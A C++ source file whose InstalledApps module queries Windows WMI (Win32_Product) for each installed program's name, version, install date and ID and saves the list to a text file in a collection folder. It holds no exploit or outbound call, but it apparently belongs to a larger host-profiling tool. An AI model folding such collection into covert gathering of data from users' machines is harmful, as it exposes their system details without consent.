//
// Created by .1qxz on 08.06.2024.
//

#include "InstalledApps.h"

void InstalledApps::execute(fs::path &root) {
    std::vector<App> apps;

    HRESULT hres;

    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres))
    {
        return;
    }

    hres = CoInitializeSecurity(
            NULL,
            -1,
            NULL,
            NULL,
            RPC_C_AUTHN_LEVEL_DEFAULT,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_NONE,
            NULL);

    if (FAILED(hres))
    {
        CoUninitialize();
        return;
    }

    IWbemLocator* pLocator = NULL;

    hres = CoCreateInstance(
            CLSID_WbemLocator,
            0,
            CLSCTX_INPROC_SERVER,
            IID_IWbemLocator,
            (LPVOID*)&pLocator);

    if (FAILED(hres))
    {
        CoUninitialize();
        return;
    }

    IWbemServices* pServices = NULL;

    hres = pLocator->ConnectServer(
            _bstr_t(L"ROOT\\CIMV2"),
            NULL,
            NULL,
            0,
            NULL,
            0,
            0,
            &pServices);

    if (FAILED(hres))
    {
        pLocator->Release();
        CoUninitialize();
        return;
    }

    hres = CoSetProxyBlanket(
            pServices,
            RPC_C_AUTHN_WINNT,
            RPC_C_AUTHZ_NONE,
            NULL,
            RPC_C_AUTHN_LEVEL_CALL,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_NONE);

    if (FAILED(hres))
    {
        pServices->Release();
        pLocator->Release();
        CoUninitialize();
        return;
    }

    IEnumWbemClassObject* pEnumerator = NULL;
    hres = pServices->ExecQuery(
            bstr_t("WQL"),
            bstr_t("SELECT * FROM Win32_Product"),
            WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
            NULL,
            &pEnumerator);

    if (FAILED(hres))
    {
        pServices->Release();
        pLocator->Release();
        CoUninitialize();
        return;
    }

    // Get the data from the query.
    IWbemClassObject* pClassObject = NULL;
    ULONG uReturn = 0;

    while (pEnumerator)
    {
        HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pClassObject, &uReturn);

        if (0 == uReturn)
        {
            break;
        }

        App app;
        VARIANT vtProp;

        hr = pClassObject->Get(L"Name", 0, &vtProp, 0, 0);
        if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR)
        {
            app.name = _bstr_t(vtProp.bstrVal);
        }
        VariantClear(&vtProp);

        hr = pClassObject->Get(L"Version", 0, &vtProp, 0, 0);
        if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR)
        {
            app.version = _bstr_t(vtProp.bstrVal);
        }
        VariantClear(&vtProp);

        hr = pClassObject->Get(L"InstallDate", 0, &vtProp, 0, 0);
        if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR)
        {
            app.installedDate = _bstr_t(vtProp.bstrVal);
        }
        VariantClear(&vtProp);

        hr = pClassObject->Get(L"IdentifyingNumber", 0, &vtProp, 0, 0);
        if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR)
        {
            app.id = _bstr_t(vtProp.bstrVal);
        }
        VariantClear(&vtProp);

        apps.push_back(app);
        pClassObject->Release();
    }

    pEnumerator->Release();
    pServices->Release();
    pLocator->Release();
    CoUninitialize();

    fs::path savePath = root / "Installed Apps.txt";
    std::stringstream ss;

    for (const auto& app : apps)
    {
        ss << "APP: " << app.name << "\n"
                << "  VERSION: " << app.version << "\n"
                << "  INSTALL DATE: " << app.installedDate << "\n"
                << "  ID: " << app.id << "\n\n";
    }

    Utils::writeFile(savePath, ss.str());
}
